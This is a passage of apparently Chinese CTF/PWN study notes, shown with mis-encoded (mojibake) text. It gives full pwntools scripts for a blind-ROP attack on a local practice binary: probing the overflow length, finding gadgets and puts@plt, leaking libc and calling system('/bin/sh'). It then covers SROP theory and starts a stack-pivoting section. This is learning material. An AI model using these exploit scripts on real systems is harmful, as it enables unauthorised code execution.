å¯ä»¥æŠŠä»–æ¯”ä½œWindowsä¸‹è„±å£³ä¹‹åçš„æ–‡ä»¶ã€‚è™½ç„¶åœ¨å®é™…æƒ…å†µä¸‹æˆ‘ä»¬çœ‹ä¸åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬dumpå‡ºæ¥çš„pltæ®µçš„å†…å®¹å¯ä»¥ä½¿ç”¨IDAè¿›è¡ŒæŸ¥çœ‹ã€‚å°†dumpæ–‡ä»¶æ‹–è¿›64ä½IDAï¼Œé€‰æ‹©binary Fileå½¢å¼æ‰“å¼€ï¼Œé€‰æ‹©64-bit mode<br>æ¥ä¸‹æ¥éœ€è¦ç»™dumpæ–‡ä»¶è®¾ç½®åŸºåœ°å€ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯ä»0x400000å¤„å¼€å§‹dumpçš„ï¼Œæ‰€ä»¥åŸºåœ°å€å°±è®¾ä¸º0x400000<br>è®¾ç½®æ­¥éª¤ï¼šedit-&gt;segments-&gt;rebase program å°†ç¨‹åºçš„åŸºåœ°å€æ”¹ä¸º 0x400000<br>ç”±äºæˆ‘ä»¬ä¹‹å‰æ‰¾åˆ°äº†putså‡½æ•°çš„pltåœ°å€0x400560ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°åç§»0x560å¤„<br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206220625.png" alt="Pasted image 20250206220625"></p><h5 id="6-æŸ¥è¯¢libcç‰ˆæœ¬"><a href="#6-æŸ¥è¯¢libcç‰ˆæœ¬" class="headerlink" title="6.æŸ¥è¯¢libcç‰ˆæœ¬"></a>6.æŸ¥è¯¢libcç‰ˆæœ¬</h5><p><a href="https://libc.blukat.me/">libc database search</a><br>è¿™é‡Œæˆ‘ä»¬ç›´æ¥è°ƒç”¨æœ¬åœ°çš„å°±è¡Œ</p><h5 id="7-getshell"><a href="#7-getshell" class="headerlink" title="7.getshell"></a>7.getshell</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">length &#x3D; 72##stop_gadget &#x3D; get_stop_addr(length)stop_gadget &#x3D; 0x4005d0##brop_gadget &#x3D; find_brop_gadget(length,stop_gadget)brop_gadget &#x3D; 0x4007bardi_ret &#x3D; brop_gadget + 9##puts_plt &#x3D; get_puts_addr(length, rdi_ret, stop_gadget)puts_plt &#x3D; 0x400565##leakfunction(length, rdi_ret, puts_plt, stop_gadget)puts_got &#x3D; 0x601018ret &#x3D; brop_gadget + 9 + 1sh &#x3D; process(&#39;.&#x2F;brop&#39;)sh.recvuntil(b&#39;password?\n&#39;)payload &#x3D; b&#39;a&#39; * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)sh.sendline(payload)data &#x3D; sh.recv(6).ljust(8,b&#39;\x00&#39;)sh.recv()puts_addr &#x3D;u64(data)print(hex(puts_addr))libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)libc_base &#x3D; puts_addr - libc.symbols[&#39;puts&#39;]print(hex(libc_base))system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]binsh_addr &#x3D; libc_base + next(libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;))payload &#x3D; b&#39;a&#39; * length + p64(ret) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)sh.sendline(payload)sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆåŠŸget shell<br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206224413.png" alt="Pasted image 20250206224413"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import*#1.æš´åŠ›æšä¸¾å‡ºæ ˆæº¢å‡ºé•¿åº¦def getsize():    i &#x3D; 1    while 1:        try:            p &#x3D; process(&#39;.&#x2F;brop&#39;)            p.recvuntil(&quot;WelCome my friend,Do you know password?\n&quot;)            p.send(i*&#39;a&#39;)            data &#x3D; p.recv()            p.close()            if not data.startswith(b&#39;No password&#39;):                return i-1            else:                i+&#x3D;1        except EOFError:#ä¸»è¦æ¢æµ‹æ˜¯å¦å…·æœ‰canary            p.close()            return i-1 size &#x3D; getsize()print (&quot;size is : %s &quot;% size)from pwn import *#2def get_stop():    addr &#x3D; 0x4005cf    while 1:        sleep(0.1)        addr +&#x3D; 1        try:            print(&quot;Now,trying the address is &quot;,hex(addr))            p &#x3D; process(&#39;.&#x2F;brop&#39;)            p.recvuntil(b&quot;WelCome my friend,Do you know password?\n&quot;)            payload &#x3D; b&#39;a&#39;*72 + p64(addr)            print(&quot;Now,the payload is &quot;,payload)            p.sendline(payload)            data &#x3D; p.recv()            p.close()            if data.startswith(b&#39;WelCome&#39;):                print (&quot;main funciton--&gt;[%s]&quot;%hex(addr))                return addr            else:                print (&#39;one success addr : 0x%x&#39;%hex(addr))        except EOFError as e:            p.close()            print(&quot;a bad addr&quot;,hex(addr))        except:            print(&quot;Can&#39;t connect,retrying&quot;)            addr -&#x3D; 1 data &#x3D; get_stop()print (&quot;Success,call Main Function address is&quot;,hex(data))from pwn import *#3def get_brop_gadget(length, stop_gadget, addr): #æŸ¥æ‰¾brop gadgetå‡½æ•°    try:        sh &#x3D; process(&#39;.&#x2F;brop&#39;)        sh.recvuntil(b&#39;password?\n&#39;)        payload &#x3D; b&#39;a&#39; * length + p64(addr) + p64(0)*6 + p64(stop_gadget)         sh.sendline(payload)        content &#x3D; sh.recv()        sh.close()        print (content)        if not content.startswith(b&#39;WelCome&#39;):          #åˆ¤æ–­æç¤ºç¬¦æ˜¯å¦å‡ºç°èµ·å§‹æç¤ºå­—ç¬¦ï¼Œå¦‚æœæœ‰è¯´æ˜ç¨‹åºæ²¡å´©æºƒ            return False        return True    except Exception:        sh.close()        return Falsedef check_brop_gadget(length, addr):#æ£€æŸ¥åœ°å€    try:        sh &#x3D; process(&#39;.&#x2F;brop&#39;)        sh.recvuntil(b&#39;password?\n&#39;)        payload &#x3D; b&#39;a&#39; * length + p64(addr) + b&#39;a&#39; * 8 * 10        sh.sendline(payload)        content &#x3D; sh.recv()        sh.close()        return False    except Exception:        sh.close()        return True#4##length &#x3D; getbufferflow_length()length &#x3D; 72##get_stop_addr(length)stop_gadget &#x3D; 0x4005d0addr &#x3D; 0x4007b0 #ç†è®ºä¸Šåº”è¯¥ä»0x400000å¼€å§‹å¯»æ‰¾ï¼Œä½†æ˜¯è¿™ä¸ªç¯èŠ‚è¦æ‰¾çš„æ˜¯Libc_csu_initå‡½æ•°ï¼Œæ‰€ä»¥å¤§å¤šæ•°çš„libcä¸­Libc_csu_initå‡½æ•°çš„èµ·å§‹åœ°å€éƒ½åœ¨0x400740ä¹‹åï¼Œæ‰€ä»¥ä¸ºäº†å‡å°‘è¯¯å·®ï¼Œä»0x400740å¼€å§‹while 1:  #å¾ªç¯é€’å¢è¦æµ‹è¯•çš„åœ°å€    print (hex(addr))    if get_brop_gadget(length, stop_gadget, addr):        print (&#39;possible brop gadget: 0x%x&#39; % addr)        if check_brop_gadget(length, addr):            print (&#39;success brop gadget: 0x%x&#39; % addr)            break    addr +&#x3D; 1def get_puts_addr(length, rdi_ret, stop_gadget):    addr &#x3D; 0x400559    while 1:        print (hex(addr))        sh &#x3D; process(&#39;.&#x2F;brop&#39;)        sh.recvuntil(b&#39;password?\n&#39;)        payload &#x3D; b&#39;A&#39; * length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)#72ä¸ªAå¡«å……æ ˆç©ºé—´ï¼Œè°ƒç”¨pop rdiï¼›ret gadgetå°†0x400000popè¿›rdiå¯„å­˜å™¨ï¼Œå¾ªç¯å¢é•¿çš„åœ°å€æ”¾åœ¨gadgetçš„retä½ç½®ï¼Œåœ¨æ‰§è¡Œå®Œgadgetåç›´æ¥è°ƒç”¨å¾ªç¯å¢é•¿çš„åœ°å€ï¼Œå¦‚æœå¢é•¿åˆ°puts_pltåœ°å€å°±ä¼šæ‰“å°rdiå¯„å­˜å™¨ä¸­åœ°å€å†…å­˜æ”¾çš„å­—ç¬¦ä¸²ï¼Œæœ€åçš„stop gadgetæ˜¯ä¸ºäº†è®©ç¨‹åºä¸å´©æºƒ        sh.sendline(payload)        try:            content &#x3D; sh.recv()            if content.startswith(b&#39;\x7fELF&#39;):#åˆ¤æ–­æ˜¯å¦æ‰“å°\x7fELF                print (&#39;find puts@plt addr: 0x%x&#39; % addr)                return addr            sh.close()            addr +&#x3D; 1        except Exception:            sh.close()            addr +&#x3D; 1##length &#x3D; getbufferflow_length()length &#x3D; 72rdi_ret &#x3D; 0x4007ba+0x9##get_stop_addr(length)stop_gadget &#x3D; 0x4005d0puts &#x3D; get_puts_addr(length,rdi_ret,stop_gadget)#5##length &#x3D; getbufferflow_length()length &#x3D; 72##stop_gadget &#x3D; get_stop_addr(length)stop_gadget &#x3D; 0x4005d0##brop_gadget &#x3D; find_brop_gadget(length,stop_gadget)brop_gadget &#x3D; 0x4007bardi_ret &#x3D; brop_gadget + 9##puts_plt &#x3D; get_puts_addr(length, rdi_ret, stop_gadget)puts_plt &#x3D; 0x400565##leakfunction(length, rdi_ret, puts_plt, stop_gadget)puts_got &#x3D; 0x601018ret &#x3D; brop_gadget + 9 + 1#æ ˆå¯¹é½sh &#x3D; process(&#39;.&#x2F;brop&#39;)sh.recvuntil(b&#39;password?\n&#39;)payload &#x3D; b&#39;a&#39; * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)sh.sendline(payload)data &#x3D; sh.recv(6).ljust(8,b&#39;\x00&#39;)sh.recv()puts_addr &#x3D;u64(data)print(hex(puts_addr))libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)libc_base &#x3D; puts_addr - libc.symbols[&#39;puts&#39;]print(hex(libc_base))system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]binsh_addr &#x3D; libc_base + next(libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;))payload &#x3D; b&#39;a&#39; * length + p64(ret) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)sh.sendline(payload)sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ğŸ˜­SROP-æš‚æ—¶å­¦ä¸æ‡‚ï¼Œå¾…ç»­"><a href="#ğŸ˜­SROP-æš‚æ—¶å­¦ä¸æ‡‚ï¼Œå¾…ç»­" class="headerlink" title="ğŸ˜­SROP(æš‚æ—¶å­¦ä¸æ‡‚ï¼Œå¾…ç»­)"></a>ğŸ˜­SROP(æš‚æ—¶å­¦ä¸æ‡‚ï¼Œå¾…ç»­)</h2><p><a href="https://xz.aliyun.com/news/12644">æ–‡ç«  - é«˜çº§ROPä¹‹SROPåˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº</a><br>SROPï¼Œå…¨ç§°ä¸ºSigreturn Oriented Programmingï¼Œä¸»è¦è§¦å‘åŸç†ä¸º<code>sigreturn</code>è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œè¿™ä¸ªç³»ç»Ÿè°ƒç”¨ä¸€èˆ¬æ˜¯ç¨‹åºåœ¨å‘ç”Ÿ signal çš„æ—¶å€™è¢«é—´æ¥åœ°è°ƒç”¨</p><h3 id="æ”»å‡»åŸç†"><a href="#æ”»å‡»åŸç†" class="headerlink" title="æ”»å‡»åŸç†"></a>æ”»å‡»åŸç†</h3><p>åˆ†æå†…æ ¸åœ¨ signal ä¿¡å·å¤„ç†çš„è¿‡ç¨‹ä¸­çš„å·¥ä½œï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå†…æ ¸ä¸»è¦åšçš„å·¥ä½œå°±æ˜¯ä¸ºè¿›ç¨‹ä¿å­˜ä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”æ¢å¤ä¸Šä¸‹æ–‡ã€‚è¿™ä¸ªä¸»è¦çš„å˜åŠ¨éƒ½åœ¨ Signal Frame ä¸­ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p><ul><li><strong>Signal Frame è¢«ä¿å­˜åœ¨ç”¨æˆ·çš„åœ°å€ç©ºé—´ä¸­ï¼Œæ‰€ä»¥ç”¨æˆ·æ˜¯å¯ä»¥è¯»å†™çš„ã€‚</strong></li><li><p>ç”±äºå†…æ ¸ä¸ä¿¡å·å¤„ç†ç¨‹åºæ— å…³ (kernel agnostic about signal handlers)ï¼Œå®ƒå¹¶ä¸ä¼šå»è®°å½•è¿™ä¸ª signal å¯¹åº”çš„ Signal Frameï¼Œ<strong>æ‰€ä»¥å½“æ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œæ­¤æ—¶çš„ Signal Frame å¹¶ä¸ä¸€å®šæ˜¯ä¹‹å‰å†…æ ¸ä¸ºç”¨æˆ·è¿›ç¨‹ä¿å­˜çš„ Signal Frame</strong>ã€‚<br>è¯´åˆ°è¿™é‡Œï¼Œå…¶å®ï¼ŒSROP çš„åŸºæœ¬åˆ©ç”¨åŸç†ä¹Ÿå°±å‡ºç°äº†ã€‚</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>çœ‹å®ŒåŸç†ä¹‹åæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œ<code>sigreturn</code> ç³»ç»Ÿè°ƒç”¨ä¼šå°†è¿›ç¨‹æ¢å¤ä¸º<strong>ä¹‹å‰â€ä¿å­˜çš„</strong>â€œï¼Œä¹Ÿå°±æ˜¯ä»æ ˆä¸­popå›åˆ°å„å¯„å­˜å™¨ï¼Œåœ¨æ‰§è¡Œ<code>sigreturn</code> ç³»ç»Ÿè°ƒç”¨æœŸé—´ï¼Œæˆ‘ä»¬å¯¹æ ˆä¸­çš„å€¼æ˜¯å¯ä»¥ä»»æ„è¯»å†™çš„ï¼Œè€Œä¸”ç”±äºå†…æ ¸ä¸ä¿¡å·å¤„ç†ç¨‹åºæ— å…³ï¼Œ <code>signal</code> å¯¹åº”çš„å„ä¸ªå¯„å­˜å™¨å€¼å¹¶ä¸ä¼šè¢«è®°å½•ï¼Œé‚£ä¹ˆï¼Œåªè¦æˆ‘ä»¬èƒ½å¤ŸåŠ«æŒæ ˆä¸­çš„æ•°æ®ï¼Œä¼ªé€ ä¸€ä¸ª <code>Signal Frame</code> ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ§åˆ¶ä»»æ„å¯„å­˜å™¨çš„å€¼</p><h4 id="è·å–shell"><a href="#è·å–shell" class="headerlink" title="è·å–shell"></a>è·å–shell</h4><p>é¦–å…ˆï¼Œæˆ‘ä»¬å‡è®¾æ”»å‡»è€…å¯ä»¥æ§åˆ¶ç”¨æˆ·è¿›ç¨‹çš„æ ˆï¼Œé‚£ä¹ˆå®ƒå°±å¯ä»¥ä¼ªé€ ä¸€ä¸ª Signal Frameï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿™é‡Œä»¥ 64 ä½ä¸ºä¾‹å­ï¼Œç»™å‡º Signal Frame æ›´åŠ è¯¦ç»†çš„ä¿¡æ¯<br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180326.png" alt="Pasted image 20250207180326"><br>å½“ç³»ç»Ÿæ‰§è¡Œå®Œ sigreturn ç³»ç»Ÿè°ƒç”¨ä¹‹åï¼Œä¼šæ‰§è¡Œä¸€ç³»åˆ—çš„ pop æŒ‡ä»¤ä»¥ä¾¿äºæ¢å¤ç›¸åº”å¯„å­˜å™¨çš„å€¼ï¼Œå½“æ‰§è¡Œåˆ° rip æ—¶ï¼Œå°±ä¼šå°†ç¨‹åºæ‰§è¡ŒæµæŒ‡å‘ syscall åœ°å€ï¼Œæ ¹æ®ç›¸åº”å¯„å­˜å™¨çš„å€¼ï¼Œæ­¤æ—¶ï¼Œä¾¿ä¼šå¾—åˆ°ä¸€ä¸ª shellã€‚è·å–shellå®é™…ä¸Šå°±æ˜¯æ‰§è¡Œäº†ç³»ç»Ÿè°ƒç”¨ execve(â€œ/bin/shâ€,0,0)<br>è·å–shelléœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p></li><li><p>æ ˆæº¢å‡ºä»¥æ§åˆ¶æ ˆçš„å†…å®¹</p></li><li>èƒ½æ§åˆ¶raxå¯„å­˜å™¨ä¸º<code>sigreturn</code> ç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„è°ƒç”¨å·</li><li>æœ‰syscallç³»ç»Ÿè°ƒç”¨å‡½æ•°æˆ–è€…æ±‡ç¼–ä»£ç </li><li>æ ˆç©ºé—´è¶³å¤Ÿå¤§</li></ul><p>å…·ä½“SROPæ“ä½œå¦‚ä¸‹</p><ol><li>é€šè¿‡æ ˆæº¢å‡ºåŠ«æŒè¿”å›åœ°å€ï¼Œæ„é€ SROP</li><li>æ§åˆ¶raxå¯„å­˜å™¨ä¸º<code>sigreturn</code> çš„ç³»ç»Ÿè°ƒç”¨å·</li><li>æ‰§è¡Œsyscallè¿›å…¥<code>sigreturn</code> ç³»ç»Ÿè°ƒç”¨</li><li>æ§åˆ¶æ ˆå¸ƒå±€ï¼Œä½¿<code>sigreturn</code> ç³»ç»Ÿè°ƒç”¨ç»“æŸåçš„popæŒ‡ä»¤èƒ½å¤Ÿå‡†ç¡®æ§åˆ¶å„ä¸ªå¯„å­˜å™¨æˆæˆ‘ä»¬æƒ³è¦çš„å€¼<br> ä¾‹å¦‚è·å–shellçš„å„å¯„å­˜å™¨æ§åˆ¶ï¼š<br> rax â€”&gt;59ï¼ˆexecveçš„ç³»ç»Ÿè°ƒç”¨å·ï¼‰<br> rdi â€”&gt; â€˜/bin/shâ€™<br> rsi â€”&gt; 0<br> rdx â€”&gt;0<br> rip â€”&gt; syscall<br> æ­¤æ—¶å†ç»§ç»­å‘ä¸‹è°ƒç”¨æ—¶å°±å¯ä»¥æ‰§è¡Œexecve(â€œ/bin/shâ€,0,0)äº†<h4 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h4>éœ€è¦æŒ‡å‡ºçš„æ˜¯ï¼Œä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åªæ˜¯å•ç‹¬çš„è·å¾—ä¸€ä¸ª shellã€‚æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå¸Œæœ›æ‰§è¡Œä¸€ç³»åˆ—çš„å‡½æ•°ã€‚æˆ‘ä»¬åªéœ€è¦åšä¸¤å¤„ä¿®æ”¹å³å¯</li></ol><ul><li><strong>æ§åˆ¶æ ˆæŒ‡é’ˆã€‚</strong></li><li><strong>æŠŠåŸæ¥ rip æŒ‡å‘çš„<code>syscall</code> gadget æ¢æˆ<code>syscall; ret</code> gadgetã€‚</strong><br>å¦‚ä¸‹å›¾æ‰€ç¤º ï¼Œè¿™æ ·å½“æ¯æ¬¡ syscall è¿”å›çš„æ—¶å€™ï¼Œæ ˆæŒ‡é’ˆéƒ½ä¼šæŒ‡å‘ä¸‹ä¸€ä¸ª Signal Frameã€‚å› æ­¤å°±å¯ä»¥æ‰§è¡Œä¸€ç³»åˆ—çš„ sigreturn å‡½æ•°è°ƒç”¨ã€‚<br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180429.png" alt="Pasted image 20250207180429"><h4 id="åç»­"><a href="#åç»­" class="headerlink" title="åç»­"></a>åç»­</h4>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨æ„é€  ROP æ”»å‡»çš„æ—¶å€™ï¼Œéœ€è¦æ»¡è¶³ä¸‹é¢çš„æ¡ä»¶</li><li><strong>å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ¥æ§åˆ¶æ ˆçš„å†…å®¹</strong></li><li><strong>éœ€è¦çŸ¥é“ç›¸åº”çš„åœ°å€</strong><ul><li><strong>â€œ/bin/shâ€</strong></li><li><strong>Signal Frame</strong></li><li><strong>syscall</strong></li><li><strong>sigreturn</strong></li></ul></li><li>éœ€è¦æœ‰å¤Ÿå¤§çš„ç©ºé—´æ¥å¡ä¸‹æ•´ä¸ª sigal frame<br>æ­¤å¤–ï¼Œå…³äº sigreturn ä»¥åŠ syscall;ret è¿™ä¸¤ä¸ª gadget åœ¨ä¸Šé¢å¹¶æ²¡æœ‰æåŠã€‚æå‡ºè¯¥æ”»å‡»çš„è®ºæ–‡ä½œè€…å‘ç°äº†è¿™äº› gadgets å‡ºç°çš„æŸäº›åœ°å€ï¼š<img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180522.png" alt="Pasted image 20250207180522">å¹¶ä¸”ï¼Œä½œè€…å‘ç°ï¼Œæœ‰äº›ç³»ç»Ÿä¸Š SROP çš„åœ°å€è¢«éšæœºåŒ–äº†ï¼Œè€Œæœ‰äº›åˆ™æ²¡æœ‰ã€‚æ¯”å¦‚è¯´<code>Linux &lt; 3.3 x86_64</code>ï¼ˆåœ¨ Debian 7.0ï¼Œ Ubuntu Long Term Supportï¼Œ CentOS 6 ç³»ç»Ÿä¸­é»˜è®¤å†…æ ¸)ï¼Œå¯ä»¥ç›´æ¥åœ¨ vsyscall ä¸­çš„å›ºå®šåœ°å€å¤„æ‰¾åˆ° syscall&amp;return ä»£ç ç‰‡æ®µã€‚å¦‚ä¸‹<img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180547.png" alt="Pasted image 20250207180547">ä½†æ˜¯ç›®å‰å®ƒå·²ç»è¢«<code>vsyscall-emulate</code>å’Œ<code>vdso</code>æœºåˆ¶ä»£æ›¿äº†ã€‚æ­¤å¤–ï¼Œç›®å‰å¤§å¤šæ•°ç³»ç»Ÿéƒ½ä¼šå¼€å¯ ASLR ä¿æŠ¤ï¼Œæ‰€ä»¥ç›¸å¯¹æ¥è¯´è¿™äº› gadgets éƒ½å¹¶ä¸å®¹æ˜“æ‰¾åˆ°ã€‚</li></ul><p><em>å€¼å¾—ä¸€è¯´çš„æ˜¯ï¼Œå¯¹äº sigreturn ç³»ç»Ÿè°ƒç”¨æ¥è¯´ï¼Œåœ¨ 64 ä½ç³»ç»Ÿä¸­ï¼Œsigreturn ç³»ç»Ÿè°ƒç”¨å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 15ï¼Œåªéœ€è¦ RAX=15ï¼Œå¹¶ä¸”æ‰§è¡Œ syscall å³å¯å®ç°è°ƒç”¨ syscall è°ƒç”¨ã€‚è€Œ RAX å¯„å­˜å™¨çš„å€¼åˆå¯ä»¥é€šè¿‡æ§åˆ¶æŸä¸ªå‡½æ•°çš„è¿”å›å€¼æ¥é—´æ¥æ§åˆ¶ï¼Œæ¯”å¦‚è¯´ read å‡½æ•°çš„è¿”å›å€¼ä¸ºè¯»å–çš„å­—èŠ‚æ•°ã€‚</em></p><h4 id="å®é™…åˆ©ç”¨"><a href="#å®é™…åˆ©ç”¨" class="headerlink" title="å®é™…åˆ©ç”¨"></a>å®é™…åˆ©ç”¨</h4><p><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180210.png" alt="Pasted image 20250207180210"></p><p><strong><em>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨ç›®å‰çš„ pwntools ä¸­å·²ç»é›†æˆäº†å¯¹äº srop çš„æ”»å‡»ã€‚</em></strong><br>pwntoolsé›†æˆäº†æœ‰å…³SROPé“¾çš„æ„é€ å‡½æ•° <code>SigreturnFrame()</code><br>å·¥å…·æ„é€ å’Œåˆ©ç”¨å¦‚ä¸‹ï¼š<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">frame &#x3D; SigreturnFrame()frame.rax &#x3D; frame.rdi &#x3D; frame.rsi &#x3D; frame.rdx &#x3D; frame.rcx &#x3D; frame.rip &#x3D; frame.rsp &#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>ç”¨ä¸å‚ä¸æ ˆå¸ƒå±€çš„æ„é€ <br>åœ¨payloadæ„é€ ä¸­åˆ©ç”¨bytes(frame)åŒ…è£¹å³å¯</p><h3 id="ç¤ºä¾‹-1"><a href="#ç¤ºä¾‹-1" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/srop/2016-360%E6%98%A5%E7%A7%8B%E6%9D%AF-srop">ctf-challenges/pwn/stackoverflow/srop/2016-360æ˜¥ç§‹æ¯-srop at master Â· ctf-wiki/ctf-challenges</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ ˆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNæŠ€å·§-æ ˆè¿ç§»</title>
      <link href="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/max1z/p/15299000.html">æ ˆè¿ç§»åŸç†ä»‹ç»ä¸åº”ç”¨ - Max1z - åšå®¢å›­</a></p><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>æˆ‘ä»¬é¦–å…ˆä»‹ç»ä¸€ä¸‹Stack pivotingçš„å«ä¹‰ï¼š<strong><em>è¯¥æŠ€å·§å°±æ˜¯åŠ«æŒæ ˆæŒ‡é’ˆæŒ‡å‘æ”»å‡»è€…æ‰€èƒ½æ§åˆ¶çš„å†…å­˜å¤„</em></strong>ï¼Œç„¶åå†åœ¨ç›¸åº”çš„ä½ç½®è¿›è¡ŒROPã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬å¯èƒ½åœ¨ä»¥ä¸‹æƒ…å†µéœ€è¦ä½¿ç”¨stack pivoting:</p><ul><li>å¯ä»¥æ§åˆ¶çš„æ ˆæº¢å‡ºçš„å­—èŠ‚æ•°è¾ƒå°‘ï¼Œéš¾ä»¥æ„é€ è¾ƒé•¿çš„ROPé“¾</li><li>å¼€å¯äº†PIEä¿æŠ¤ï¼Œæ ˆåœ°å€æœªçŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ ˆåŠ«æŒåˆ°å·²çŸ¥çš„åŒºåŸŸã€‚</li><li>å…¶å®ƒæ¼æ´éš¾ä»¥åˆ©ç”¨ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œè½¬æ¢ï¼Œæ¯”å¦‚è¯´å°†æ ˆåŠ«æŒåˆ°å †ç©ºé—´ï¼Œä»è€Œåœ¨å †ä¸Šå†™ropåŠè¿›è¡Œå †æ¼æ´åˆ©ç”¨<br>æ­¤å¤–ï¼Œåˆ©ç”¨ stack pivotingæœ‰ä»¥ä¸‹å‡ ä¸ª<strong>è¦æ±‚</strong>ï¼š</li><li>å¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</li><li>å¯ä»¥æ§åˆ¶spæŒ‡é’ˆã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæ§åˆ¶æ ˆæŒ‡é’ˆä¼šä½¿ç”¨ROPï¼Œå¸¸è§çš„æ§åˆ¶æ ˆæŒ‡é’ˆçš„gadgetsä¸€èˆ¬æ˜¯<code>pop 